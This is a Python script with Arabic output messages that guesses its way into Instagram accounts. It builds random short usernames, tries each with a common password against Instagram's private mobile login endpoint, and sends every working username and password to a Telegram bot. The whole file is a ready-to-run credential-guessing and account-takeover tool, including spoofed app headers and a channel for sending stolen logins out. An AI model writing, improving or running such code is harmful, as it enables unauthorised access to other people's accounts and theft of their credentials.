import random
import string
import requests
import os
bot_token = input('TOKEN: ')
chat_id = input('ID: ')
common_passwords = [
    "123456654321", "١٢٣١٢٣١٢٣", "00998877", "1234554321", "1122334455",
    "qwerty", "0099887766", "qqwweerr", "iloveyou", "aassddff", "llkkjjhh",
    "ppooiiuu", "1020304050", "102030405060708090", "zxcvbnm", "123123123","19701970", '19711971', '19721972', '19731973', '19741974', '19751975', '19761976', '19771977', '19781978', '19791979', '19801980', '19811981', '19821982', '19831983', '19841984', '19851985', '19861986', '19871987', '19881988', '19891989', '19901990', '19911991', '19921992', '19931993', '19941994', '19951995', '19961996', '19971997', '19981998', '19991999', '20002000', '20012001', '20022002', '20032003', '20042004', '20052005', '20062006', '20072007', '20082008', '20092009', '20102010', '20112011', '20122012', '20132013', '20142014', '20152015', '20162016', '20172017', '20182018', '20192019', '20202020', '20212021', '20222022', '20232023', '20242024','20252025',"qwertyuiopasdfghjklzxcvbnm","poiuytrewqlkjhgfdsamnbvcxz"
]
username_patterns = [
    "Y_7_Y_Y", "X_2_X_2", "A_3_A_A", "Z_9_Z_9", "T_1_T_1",
    "A_5_B_7", "P_3_X_8", "L_4_A_9", "R_0_Y_6", "_9K_3G", "B_8L_5K", "#_#_#", "___##","__###","##___","###__","#####","#_#_#_","_#_#_"
]
def generate_username():
    pattern = random.choice(username_patterns)
    username = ''.join(random.choice(string.ascii_uppercase + string.digits) if char == '#' or char == 'Y' or char == 'X' or char == 'A' or char == 'Z' or char == 'T' else char for char in pattern)
    return username
def check_account_status(username, password):
    cookies = {
        'mid': 'Zzo2GgABAAGpB_fgXVRHybeIfDZ4',
        'csrftoken': 'Za1lSfgIgwBKmLXBMMZEYojTJP8OpRVJ',
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'i.instagram.com',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Instagram 6.12.1 Android (29/10; 480dpi; 1080x2137; HUAWEI/HONOR; JSN-L22; HWJSN-H; kirin710; en_SA)',
        'Cookie2': os.getenv('Version', '') + '=1',
        'Accept-Language': 'en-SA, en-US',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': 'AQ==',
    }
    data = {
        'ig_sig_key_version': '4',
        'signed_body': f'1b5aedf457d491db856b0dfb843668a29ed832a7c59b781789577af0d7f74552.{{"username":"{username}","password":"{password}","device_id":"android-8c575f33d2787fa2","guid":"04e668af-1663-4435-907a-df7109e4607f","_csrftoken":"Za1lSfgIgwBKmLXBMMZEYojTJP8OpRVJ"}}',
    }
    response = requests.post('https://i.instagram.com/api/v1/accounts/login/', cookies=cookies, headers=headers, data=data)
    response_text = response.text
    if 'authenticated": true' in response_text:
        print(f"الحساب صحيح ✅ | اليوزر: {username} | الباسورد: {password}")
        send_to_telegram(f"*الحساب صحيح ✅ | اليوزر: {username} | الباسورد: {password}*")
    elif 'checkpoint_url' in response_text:
        print(f"الحساب بحاجة إلى تحقق إضافي | اليوزر: {username}")
        send_to_telegram(f"*الحساب بحاجة إلى تحقق إضافي | اليوزر: {username}*")
    elif 'error_type' in response_text:
        print(f"الحساب غير صحيح ❌ | اليوزر: {username} | الباسورد: {password}")
    else:
        print(f"حدث خطأ غير متوقع مع اليوزر: {username} | الباسورد: {password}")
def send_to_telegram(message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown'
    response = requests.get(url)
    return response
while True:
    user = generate_username()
    password = random.choice(common_passwords)
    check_account_status(user, password)